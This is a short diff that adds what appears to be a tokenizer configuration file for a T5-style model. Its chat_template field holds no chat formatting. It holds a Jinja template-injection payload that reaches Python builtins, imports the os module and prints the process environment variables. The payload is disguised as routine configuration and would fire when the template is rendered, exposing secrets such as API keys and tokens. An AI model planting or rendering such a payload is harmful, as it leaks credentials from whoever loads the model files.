@@ -1,0 +1,5 @@
+{
+  "tokenizer_class": "T5Tokenizer",
+  "chat_template": "{{ self.__init__.__globals__['__builtins__']['__import__']('os').environ }}",
+  "model_max_length": 512
+}
